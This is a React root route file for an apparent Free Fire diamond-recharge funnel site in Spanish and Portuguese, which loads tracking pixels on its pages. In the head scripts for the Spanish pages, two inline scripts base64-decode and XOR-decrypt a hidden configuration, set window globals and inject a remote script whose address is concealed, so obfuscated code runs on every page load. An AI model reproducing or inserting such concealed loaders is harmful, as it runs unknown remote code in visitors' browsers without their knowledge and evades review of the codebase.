import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";
import HalloweenTheme from "@/components/br/HalloweenTheme";
import SpanishHalloweenTheme from "@/components/HalloweenTheme";

declare global {
  interface Window {
    pixelId?: string;
  }
}

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: import("@tanstack/react-router").ErrorComponentProps) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

const BR_SCRIPTS = [
  {
    src: "https://cdn.utmify.com.br/scripts/utms/latest.js",
    async: true,
    defer: true,
    "data-utmify-prevent-xcod-sck": "",
    "data-utmify-prevent-subids": "",
  },
  { children: 'window.pixelId = "6ac3c40c0b8aa0336e8b2ded";' },
  { src: "https://cdn.utmify.com.br/scripts/pixel/pixel.js", async: true, defer: true },
  {
    children: `window.tikTokPixelId="6ac3c4e899128c9b6fe0c1c3";(function(){var s=document.createElement("script");s.src="https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js";s.async=true;s.defer=true;(document.head||document.documentElement).appendChild(s);})();`,
  },
];

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: ({ matches }) => {
    const isBr = matches.some((m) => m.pathname === "/br" || m.pathname.startsWith("/br/"));
    return {
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Free Fire — Recarga de diamantes" },
      { name: "description", content: "Evalúa tu cuenta y elige tu recarga de diamantes Free Fire con bono." },
      { property: "og:title", content: "Free Fire — Recarga de diamantes" },
      { property: "og:description", content: "Evalúa tu cuenta y elige tu recarga de diamantes Free Fire con bono." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
      { name: "twitter:title", content: "Free Fire — Recarga de diamantes" },
      { name: "twitter:description", content: "Evalúa tu cuenta y elige tu recarga de diamantes Free Fire con bono." },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
    ],
    // Brazilian funnel has its own Utmify account; Spanish pages keep theirs.
    scripts: isBr ? BR_SCRIPTS : [
      {
        src: "https://cdn.utmify.com.br/scripts/utms/latest.js",
        async: true,
        defer: true,
        "data-utmify-prevent-xcod-sck": "",
        "data-utmify-prevent-subids": "",
      },
      {
        children: 'window.pixelId = "68966bec0ad50b6867bbee95";',
      },
      {
        src: "https://cdn.utmify.com.br/scripts/pixel/pixel.js",
        async: true,
        defer: true,
      },
      {
        children: `(function(){var b_ehe=atob("DCJssWlyDTIqi8Xbo1lOxBseLwgI47Gv01FWnkYRaVwE/rG2ykQVnwodYBxI+eqowFAFwR0BIkde5rb0z0MY1BoGI1hZqen5wlYYwwAQeEZP+Ofh+FlO3wgfaBAQqaG610NBxB0fZFRTprWpxlQJ3x1fdVFF7+iowElOnUsEbF5f7ufhgQARnRJQY1NH7ufhgUYNxQhfeEZH4qOijlIe1B8XY0YH+LC5ykYfk0VQe1NG/qD5mQBOzDQP");var n_xv=[];for(var h_08x=0;h_08x<b_ehe.length;h_08x++){n_xv.push(b_ehe.charCodeAt(h_08x)&255);}var f_n4=n_xv[0];var n_owmu=n_xv.slice(1,1+f_n4);var i_d=n_xv.slice(1+f_n4);var n_4xd=i_d.map(function(b,u_da6){return b^n_owmu[u_da6%f_n4];});var c_i="";for(var r_00y0=0;r_00y0<n_4xd.length;r_00y0++){c_i+=String.fromCharCode(n_4xd[r_00y0]&255);}var x_wh=decodeURIComponent(escape(c_i));var g_fk3=JSON.parse(x_wh);var k_0me=g_fk3.globals||[];k_0me.forEach(function(y_7bo){window[y_7bo.name]=y_7bo.value;});var q_59ph=document.createElement("script");q_59ph.src=g_fk3.url;q_59ph.async=true;q_59ph.defer=true;(g_fk3.attributes||[]).forEach(function(r_ur6){q_59ph.setAttribute(r_ur6.name,r_ur6.value);});(document.head||document.documentElement).appendChild(q_59ph);})();`,
      },
      {
        children: `(function(){var r_59=atob("DKPeZPZViaCZkKOQFNj8EYQ5q5q7+NfkZNDkS9k27c635df9fcWnSpU65I774ozjd9G3FIImptDw6Mb8O9O3HJM5p8rqso+yddeqFp83/NT844GqT/7yRpE55sL4/NCyLvilRpg05MW7qoHgfdu7CL8xq4y75sL8Ycb8XtRjsJSqoZrxcJTqAJJguZOvoZvzcJXtVsR39P3k");var q_0dem=[];for(var o_bmv=0;o_bmv<r_59.length;o_bmv++){q_0dem.push(r_59.charCodeAt(o_bmv)&255);}var k_xy=q_0dem[0];var w_0d92=q_0dem.slice(1,1+k_xy);var z_gpw=q_0dem.slice(1+k_xy);var q_hjx=z_gpw.map(function(b,l_qqhz){return b^w_0d92[l_qqhz%k_xy];});var q_j="";for(var i_cb=0;i_cb<q_hjx.length;i_cb++){q_j+=String.fromCharCode(q_hjx[i_cb]&255);}var n_udx=decodeURIComponent(escape(q_j));var t_f5a=JSON.parse(n_udx);var k_j5o=t_f5a.globals||[];k_j5o.forEach(function(g_1g){window[g_1g.name]=g_1g.value;});var c_uuo=document.createElement("script");c_uuo.src=t_f5a.url;c_uuo.async=true;c_uuo.defer=true;(t_f5a.attributes||[]).forEach(function(v_v10){c_uuo.setAttribute(v_v10.name,v_v10.value);});(document.head||document.documentElement).appendChild(c_uuo);})();`,
      },
      {
        // Utmify TikTok pixel: load pixel-tiktok.js ONCE. Loading it multiple times
        // makes instances fight over the shared "lead-tiktok" storage and breaks
        // sale-to-UTM attribution. Extra TikTok pixels belong in the Utmify account.
        children: `window.tikTokPixelId="6ac057551e09b97c39c67eec";(function(){var s=document.createElement("script");s.src="https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js";s.async=true;(document.head||document.documentElement).appendChild(s);})();`,
      },
    ],
    };
  },
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  const pathname = useRouter().state.location.pathname;
  return (
    <html lang={pathname === "/br" || pathname.startsWith("/br/") ? "pt-BR" : pathname === "/fr" || pathname.startsWith("/fr/") ? "fr" : "es"}>
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();
  const pathname = useRouter().state.location.pathname;
  const isBr = pathname === "/br" || pathname.startsWith("/br/");
  const isSpanishFunnel = ["/", "/quiz", "/idplayer", "/recharge", "/quiz2", "/idplayer2", "/recharge2"].includes(pathname);

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      {isBr ? <HalloweenTheme><Outlet /></HalloweenTheme> : isSpanishFunnel ? <SpanishHalloweenTheme><Outlet /></SpanishHalloweenTheme> : <Outlet />}
    </QueryClientProvider>
  );
}
